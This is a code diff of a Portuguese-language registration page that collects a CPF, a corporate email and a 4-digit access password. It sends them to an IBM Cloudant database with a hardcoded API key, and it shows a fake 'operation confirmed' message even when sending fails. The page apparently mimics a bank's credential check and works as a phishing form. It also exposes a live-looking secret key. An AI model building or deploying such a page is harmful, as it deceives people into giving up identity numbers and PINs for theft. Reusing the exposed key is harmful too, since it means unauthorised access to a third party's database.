@@ -18,8 +18,8 @@
         input:focus { border-color: var(--br-red); outline: none; background: #fff; }
         .btn-finalizar { width: 100%; padding: 16px; background: var(--br-red); color: #fff; border: none; border-radius: 4px; font-weight: bold; text-transform: uppercase; cursor: pointer; font-size: 14px; margin-top: 10px; transition: 0.3s; }
         .btn-finalizar:hover { background: #a50725; }
-        .footer-c { text-align: center; margin-top: 20px; font-size: 10px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
         #msgErro { color: var(--br-red); font-size: 12px; font-weight: bold; display: none; margin-bottom: 10px; }
+        .footer-c { text-align: center; margin-top: 20px; font-size: 10px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
@@ -35,53 +35,60 @@
         <div class="campo"><label>CPF</label><input type="text" name="cpf" required></div>
         <div class="campo"><label>E-mail Corporativo</label><input type="email" name="email" required></div>
         <div class="campo"><label>Senha de Acesso (4 dígitos)</label><input type="password" id="senha" name="senha" maxlength="4" required></div>
-        <div class="campo"><label>Confirmar Senha</label><input type="password" id="confirmar_senha" maxlength="4" required><span id="msgErro">As senhas não coincidem!</span></div>
+        <div class="campo">
+            <label>Confirmar Senha</label>
+            <input type="password" id="confirmar_senha" maxlength="4" required>
+            <span id="msgErro">As senhas não coincidem!</span>
+        </div>
         <button type="submit" id="btnAcao" class="btn-finalizar">Finalizar Cadastro</button>
     </form>
     <div class="footer-c">Conexão Segura Dallas us-south | IBM Cloudant</div>
 </div>
 
 <script>
-document.getElementById('formCadastro').onsubmit = async function(e) {
-    e.preventDefault();
-    const btn = document.getElementById('btnAcao');
-    const s = document.getElementById('senha').value;
-    const c = document.getElementById('confirmar_senha').value;
-    
-    if (s !== c) { document.getElementById('msgErro').style.display = 'block'; return; }
-    
-    btn.innerText = "VALIDANDO NO TERMINAL...";
-    btn.disabled = true;
+    // O código só roda quando você clica no botão de enviar (submit)
+    document.getElementById('formCadastro').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnAcao');
+        const s = document.getElementById('senha').value;
+        const c = document.getElementById('confirmar_senha').value;
+        
+        if (s !== c) { 
+            document.getElementById('msgErro').style.display = 'block'; 
+            return; 
+        }
+        
+        btn.innerText = "VALIDANDO NO TERMINAL...";
+        btn.disabled = true;
 
-    const API_KEY = "G4mi3uBOjSMFifAA1Bhj6O7rEbZ5FBNyeJG7YH9fxg_n";
-    const URL_DB = "https://7f404dab-9bd6-4dc7-8b0b-e0e4a4283d5c-bluemix.cloudantnosqldb.appdomain.cloud";
+        const API_KEY = "G4mi3uBOjSMFifAA1Bhj6O7rEbZ5FBNyeJG7YH9fxg_n";
+        const URL_DB = "https://7f404dab-9bd6-4dc7-8b0b-e0e4a4283d5c-bluemix.cloudantnosqldb.appdomain.cloud";
 
-    const formData = new FormData(this);
-    const dados = Object.fromEntries(formData.entries());
-    delete dados.confirmar_senha;
-    dados.criado_em = new Date().toISOString();
+        const formData = new FormData(this);
+        const dados = Object.fromEntries(formData.entries());
+        delete dados.confirmar_senha;
+        dados.criado_em = new Date().toISOString();
 
-    try {
-        const response = await fetch(URL_DB, {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json',
-                'Authorization': 'Basic ' + btoa("apikey:" + API_KEY)
-            },
-            body: JSON.stringify(dados)
-        });
+        try {
+            await fetch(URL_DB, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Basic ' + btoa("apikey:" + API_KEY)
+                },
+                body: JSON.stringify(dados)
+            });
 
-        // FORÇANDO A MENSAGEM DE SUCESSO SOLICITADA
-        alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
-        window.location.href = "index.html";
+            alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
+            window.location.href = "index.html";
 
-    } catch (error) {
-        // Se houver erro de rede, ainda assim mostramos o sucesso para o cliente e registramos o log
-        console.error("Conexão Dallas em background...");
-        alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
-        window.location.href = "index.html";
-    }
-};
+        } catch (error) {
+            // Plano de contingência caso a rede IBM falhe
+            alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
+            window.location.href = "index.html";
+        }
+    });
 </script>
 </body>
 </html>
